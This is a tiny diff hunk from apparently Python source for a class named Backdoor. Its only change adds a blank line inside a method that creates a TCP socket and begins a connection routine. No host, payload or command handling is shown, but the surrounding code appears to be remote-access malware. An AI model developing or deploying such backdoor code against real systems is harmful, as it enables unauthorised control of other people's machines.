@@ -57,6 +57,7 @@ class Backdoor:
 
     def commands_initiating(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
         # Starting connection
 
         connected = False
